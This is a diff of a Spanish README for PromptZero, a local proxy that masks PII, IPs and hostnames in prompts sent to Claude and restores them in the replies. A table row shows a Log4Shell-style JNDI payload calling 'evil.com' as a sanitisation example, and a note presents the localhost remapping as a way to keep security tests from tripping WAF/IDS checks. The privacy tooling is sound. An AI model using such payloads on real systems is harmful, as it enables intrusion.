@@ -591,7 +591,7 @@ TU ENTORNO
 │  Tu App/Script ──▶ PromptZero (localhost:8000)              │
 │       ▲                │                                    │
 │       │                ① Detectar PII, IPs, hosts           │
-│       │                ② Reemplazar con datos ficticios      │
+│       │                ② Reemplazar con datos ficticios     │
 │       └────────────────③ Reenviar prompt limpio             │
 │                        ④ Recibir respuesta de Claude        │
 │                        ⑤ Restaurar valores reales           │
@@ -610,64 +610,334 @@ TU ENTORNO
 
 ## Datos que protege
 
-| Tipo | Dato real | Dato sintético |
+| Categoría | Real → Sintético | Detección |
 |---|---|---|
-| IP (pentesting) | `192.168.1.45` | `127.0.0.1` |
-| Hostname | `db.prod.empresa.com` | `alpha.localhost` |
-| Email | `juan@empresa.com` | `user001@fakecorp.local` |
-| Nombre / Apellido | `Juan García` | `Alice Harrington` |
-| Empresa | `Empresa XYZ S.A.` | `Globex Industries` |
-| Teléfono | `+54 11 4444-5555` | `+1-555-000-0001` |
-| DNI / Documento | `28.456.123` | `FAKE-ID-000001` |
-| Tarjeta de crédito | `4111 1111 1111 1234` | `4111-1111-1111-0001` |
-| Token / API key | `sk-ant-api03-xxx...` | `FAKE_TOKEN_0001_xxxxxxxx` |
+| IPv4 | `203.0.113.50` → `127.0.0.1` | Regex |
+| IPv6 | `2001:db8::1` → `::1` | Regex |
+| Hostname / FQDN | `vpn.empresa.com` → `alpha.localhost` | Regex |
+| URL | `https://api.empresa.com/v2` → `https://bravo.localhost/v2` | Regex |
+| host:port | `db.internal:5432` → `charlie.localhost:5432` | Regex |
+| Email | `juan@empresa.com` → `user001@fakecorp.local` | Regex + NLP |
+| Teléfono (US/CA) | `+1-555-123-4567` → `+1-555-000-0001` | Regex + NLP |
+| Teléfono (LatAm + ES) | `+54 11 4444-5555`, `+56 9 1234 5678`, `+34 612 345 678`, `+52 55 1234 5678`, `+57 300 123 4567`, `+598 99 123 456` → `+1-555-000-0001` | **Regex (LatAm/ES)** |
+| Nombre de persona | `Juan García`, `María Fernández` | **NLP (spaCy en+es)** |
+| Empresa / Organización | `Empresa XYZ S.A.`, `Nexabank Financial S.A.` | **NLP (spaCy en+es)** |
+| DNI Argentina | `DNI 28.456.123` → `DNI 11.111.001` | **Regex (AR)** |
+| CUIT/CUIL Argentina | `20-12345678-9` → `20-11111001-1` | **Regex (AR)** |
+| RUT Chile | `12.345.678-K` → `11.111.001-1` | **Regex (CL)** |
+| DNI/NIE España | `12345678A`, `X1234567A` → `X0000001A` | **Regex (ES) + NLP** |
+| CI Uruguay | `1.234.567-8` → `1.111.001-1` | **Regex (UY)** |
+| Cédula Colombia | `CC 1.234.567` → `CC 1.111.001` | **Regex (CO)** |
+| CURP México | `AAAA000000HAAAAA00` → `FAKE000001HDFXXX11` | **Regex (MX)** |
+| RFC México | `AAAA000000AAA` → `FAKE000001XX1` | **Regex (MX)** |
+| Pasaporte | `AAB123456` → `XX0000001` | **NLP (Presidio)** |
+| SSN (US) | `123-45-6789` → `000-00-0001` | Regex + NLP |
+| Tarjeta de crédito | `4111 1111 1111 1234` → `4111-1111-1111-0001` | Regex + NLP |
+| IBAN | `GB29NWBK60161331926819`, `AR1500011110000…` → `FAKEIBAN000…` | NLP |
+| Token / API key (≥32 chars) | `sk-ant-api03-xxxxxx...` → `FAKE_TOKEN_0001_xxxxxxxx` | Regex |
 | Payload con host | `${jndi:ldap://evil.com}` | `${jndi:ldap://bravo.localhost}` |
 
 > **Modo pentesting:** Las IPs se mapean a `127.0.0.x` y los hostnames a
-> `<word>.localhost` — esto enmarca los tests como locales, evita alertas
-> de WAF/IDS y es técnicamente correcto ya que las pruebas se realizan desde
-> infraestructura controlada.
+> `<palabra>.localhost` — esto enmarca los tests como infraestructura local
+> (RFC 6761), evita disparar WAF/IDS y, como cada hostname recibe una
+> palabra distinta del pool (`alpha`, `bravo`, …, NATO + aves + colores),
+> el modelo nunca confunde dos entidades distintas.
+
+---
+
+## Arquitectura
+
+```
+promptzero/
+├── main.py          ← Proxy FastAPI (drop-in para api.anthropic.com)
+├── sanitizer.py     ← Motor de detección: NLP (Presidio+spaCy) + Regex
+├── setup.sh         ← Setup en un comando
+├── run_demo.sh      ← Orquestador del demo de 90 segundos
+├── DEMO_SCRIPT.md   ← Storyboard del video
+├── requirements.txt
+├── .env.example
+└── examples/
+    ├── poc/                ← PoC: 5 datasets ficticios + demos local/HTML/E2E
+    ├── document_summary/   ← Summary de PDF/DOCX/TXT con protección PII
+    └── pentest_report/     ← Reportes técnicos/ejecutivos desde findings JSON
+```
+
+### Capas de detección
+
+```
+Texto de entrada
+    │
+    ├─▶ [ Capa NLP — Presidio + spaCy (en + es) ]
+    │     PERSON, ORGANIZATION, PHONE, EMAIL,
+    │     CREDIT_CARD, IBAN, SSN, PASSPORT,
+    │     NATIONAL_ID (ES_NIF, NRP), URL, IP_ADDRESS
+    │
+    ├─▶ [ Capa Regex — PII por país ]
+    │     AR: DNI, CUIT/CUIL          CL: RUT
+    │     ES: DNI/NIE                 UY: CI
+    │     CO: Cédula (CC)             MX: CURP, RFC
+    │     Teléfonos: +34 +52 +54 +55 +56 +57 +598
+    │
+    ├─▶ [ Capa Regex — red e infraestructura ]
+    │     IPv4, IPv6, hostnames, host:port,
+    │     tokens/API keys largos, URLs
+    │
+    └─▶ [ Merge + deduplicación por span ]
+          └─▶ Reemplazar real → sintético
+                └─▶ Guardar en tabla de mapping por sesión
+```
+
+### Tabla de mapping por sesión
+
+Cada conversación tiene una **tabla bidireccional real↔ficticio scoped a la sesión**.
+El mismo valor real siempre mapea al mismo valor sintético dentro de la sesión —
+así tus conversaciones quedan coherentes de punta a punta.
+
+```
+Sesión: "pentest-acmecorp-2026"
+─────────────────────────────────────────────────
+Valor real                   Valor sintético
+─────────────────────────────────────────────────
+192.168.1.45        ←──────▶  127.0.0.1
+db.prod.acme.com    ←──────▶  alpha.localhost
+Juan García         ←──────▶  Alice Harrington
+admin@acme.com      ←──────▶  user001@fakecorp.local
+─────────────────────────────────────────────────
+       Guardada en local. Nunca se envía a ningún lado.
+```
 
 ---
 
 ## Inicio rápido
 
 ```bash
-git clone https://github.com/openbash/promptzero
+git clone https://github.com/openbashok/promptzero
 cd promptzero
 
-./setup.sh          # instala todo + modelo NLP (~560 MB)
-./setup.sh small    # modelo más liviano (~12 MB, menos preciso)
+# Setup completo (venv + deps + modelos spaCy en+es, ~560 MB c/u)
+./setup.sh
+# Variantes: ./setup.sh medium (~40 MB)  /  ./setup.sh small (~12 MB)
+#            ./setup.sh en-only         (solo inglés)
 
+# Configurar
 cp .env.example .env
-# → agregar ANTHROPIC_API_KEY
+# → editar .env y poner ANTHROPIC_API_KEY=sk-ant-...
 
+# Levantar el proxy
 python main.py
+# Escuchando en http://localhost:8000
 ```
 
-Solo cambiás `base_url` en tu SDK:
+Después, en tu app:
 
 ```python
+import anthropic
+
 client = anthropic.Anthropic(
     api_key="tu-api-key",
-    base_url="http://localhost:8000",  # ← único cambio
+    base_url="http://localhost:8000",   # ← único cambio
 )
+```
+
+---
+
+## Uso
+
+### Python SDK
+
+```python
+import anthropic
+
+client = anthropic.Anthropic(base_url="http://localhost:8000", api_key="…")
+msg = client.messages.create(
+    model="claude-opus-4-6",
+    max_tokens=1024,
+    messages=[{"role": "user", "content":
+        "Analizá el log: cliente Juan García (juan@empresa.com) "
+        "se conectó desde 192.168.1.45 a db.prod.empresa.com"
+    }],
+    extra_headers={"x-session-id": "sesion-1"},  # ← mantiene mappings consistentes
+)
+# → La respuesta de Claude tiene los valores reales restaurados.
+```
+
+### curl
+
+```bash
+curl -X POST http://localhost:8000/v1/messages \
+  -H "x-api-key: $ANTHROPIC_API_KEY" \
+  -H "anthropic-version: 2023-06-01" \
+  -H "content-type: application/json" \
+  -d '{
+    "model": "claude-opus-4-6",
+    "max_tokens": 1024,
+    "messages": [{"role":"user","content":"…tu prompt con PII…"}]
+  }'
+```
+
+### Endpoints de administración
+
+```bash
+GET    /health                          # estado + upstream proxy activo
+GET    /stats                           # contadores acumulados desde startup
+GET    /sessions/{session_id}/mappings  # tabla real↔ficticio (debug)
+DELETE /sessions/{session_id}           # resetea la tabla de la sesión
+```
+
+`/stats` está pensado para overlay en demos en vivo:
+
+```bash
+watch -n 1 'curl -s localhost:8000/stats | jq'
+```
+
+Te tira algo así, actualizándose cada segundo:
+
+```json
+{
+  "uptime_seconds": 142.3,
+  "requests": { "total": 7, "messages": 5, "passthrough": 1, "errors": 0 },
+  "bytes":    { "sanitized_in": 12480, "desanitized_out": 28350 },
+  "pii_spans": {
+    "total_unique": 47,
+    "by_kind": { "person": 8, "org": 5, "ipv4": 14, "hostname": 9,
+                 "email": 6, "national_id_ar_dni": 3, "phone": 2 }
+  }
+}
+```
+
+Además la terminal del proxy imprime **una línea coloreada por request**:
+
+```
+[trace] POST /v1/messages     session=poc-pent  +4 spans (total 4: 1 phone, 1 email, 1 ipv4, 1 url)  in= 197B out= 494B  200 2012ms
+[trace] POST /v1/messages     session=poc-pent  +3 spans (total 7: 2 ipv4, 1 person, 1 hostname)  in= 185B out= 697B  200 1273ms
+[trace] GET   /v1/models           (passthrough, no sanitization)  200  367ms
+```
+
+Perfecto para split-screen con Claude Code o cualquier cliente: cada turno
+ves exactamente cuánta PII se enmascaró en esa request.
+
+---
+
+## Usar con Claude Code CLI
+
+El proxy es drop-in para `api.anthropic.com`. Para que Claude Code vaya por PromptZero:
+
+```bash
+# Terminal 1 — PromptZero corriendo
+python main.py
+
+# Terminal 2 — Claude Code apuntando al proxy
+export ANTHROPIC_BASE_URL=http://localhost:8000
+claude
+# Cada prompt que tipeás se sanitiza antes de llegar a Claude,
+# y las respuestas se desanonimizan antes de llegar a tu terminal.
+```
+
+El proxy maneja toda la superficie de la API:
+
+| Ruta | Comportamiento |
+|---|---|
+| `POST /v1/messages`              | Sanitizado → forward. Response desanitizado. Streaming OK. |
+| `POST /v1/messages/count_tokens` | Sanitizado para que el conteo refleje el prompt real enviado. |
+| Cualquier otra `/v1/*`           | Forward sin tocar (`models`, `organizations`, `files`, `batches`, …) |
+
+---
+
+## Inspeccionar el tráfico upstream con Burp Suite
+
+¿Querés **probar** que ningún dato sensible sale de tu máquina? Ruteá la
+conexión upstream (PromptZero → `api.anthropic.com`) por Burp y mirá cada
+byte.
+
+```bash
+# En .env:
+UPSTREAM_PROXY=http://127.0.0.1:8080
+UPSTREAM_CA_BUNDLE=/Users/vos/burp-ca.pem    # opción recomendada
+# o, para una demo rápida (inseguro):
+# UPSTREAM_VERIFY=false
+```
+
+Pasos:
+
+1. Exportá el CA de Burp como PEM: `Burp → Proxy → Settings → Import/export CA → PEM`
+2. Habilitá el listener de Burp en `127.0.0.1:8080`
+3. Editá `.env` con las variables de arriba, reiniciá `python main.py`
+4. `curl localhost:8000/health` → tiene que mostrar el `upstream_proxy` activo
+5. Ejecutá tu cliente (Claude Code, `demo_html.py`, lo que sea)
+6. Mirá en Burp **Proxy → HTTP history**: cada request a `api.anthropic.com`
+   muestra el body **sanitizado**. Filtrá por valores reales (`nexabank`,
+   tu IP) → **vacío**. Esa es la prueba.
+
+```
+┌─────────┐  HTTP   ┌────────────┐  HTTPS   ┌──────────┐  HTTPS  ┌─────────────────┐
+│ Claude  │────────▶│ PromptZero │─────────▶│   Burp   │────────▶│ api.anthropic   │
+│  CLI    │  claro  │   :8000    │  TLS     │  :8080   │  TLS    │     .com        │
+└─────────┘         │ sanitiza   │          │  MITM    │         └─────────────────┘
+                    │ desanitiza │          │ inspect  │
+                    └────────────┘          └──────────┘
 ```
 
 ---
 
 ## Ejemplos incluidos
 
+### Proof of Concept
+
+5 datasets ficticios (datos personales, engagement de pentest completo con
+HTTP req/res + payloads, catálogo de inyecciones, incident response, chat
+de soporte) + tres scripts de demo:
+
 ```bash
-# Resumir un documento con PII protegida
+cd examples/poc
+
+# Demo standalone (sin llamar a Claude) — original / sanitizado / desanitizado
+python demo_local.py
+python demo_local.py data/01_personal_records.json
+
+# Reporte HTML visual — ideal para video. Paneles side-by-side coloreados.
+python demo_html.py --open
+python demo_html.py --with-claude --task triage \
+    --dataset data/04_incident_response.json --out ir.html --open
+
+# E2E real contra Claude API (proxy tiene que estar corriendo)
+python demo_claude.py
+python demo_claude.py --dataset data/04_incident_response.json --task triage
+
+# Diagnóstico de Burp — 5 pasos con PASS/FAIL claro
+python diagnose_upstream.py
+```
+
+### Document Summary
+
+```bash
 cd examples/document_summary
 python summarize.py contrato.pdf --lang es
-
-# Generar reporte de pentesting desde findings.json
-cd examples/pentest_report
-python report.py findings.json --mode executive --lang es --out reporte.md
-python report.py findings.json --protect "P@ssw0rd1" "token_secreto"
+python summarize.py incident_report.docx --mode executive --lang es
 ```
+
+### Pentest Report Generator
+
+```bash
+cd examples/pentest_report
+
+python report.py findings.json                                  # reporte técnico completo
+python report.py findings.json --mode executive --lang es --out ejecutivo.md
+python report.py findings.json --mode remediation --out fixes.md
+python report.py findings.json --protect "P@ssw0rd1" "Verano2024!"   # mascarar passwords cortas
+```
+
+---
+
+## Grabar el demo de 90 segundos
+
+```bash
+./run_demo.sh --check   # verifica todo (venv, .env, Burp, claude CLI)
+./run_demo.sh           # arranca PromptZero con el banner de upstream
+```
+
+Después seguís el storyboard de `DEMO_SCRIPT.md` (segundo por segundo,
+prompt exacto para pegar en Claude Code, layout de pantalla, alternativas
+de B-roll y comandos de emergencia si algo falla en vivo).
 
 ---
 
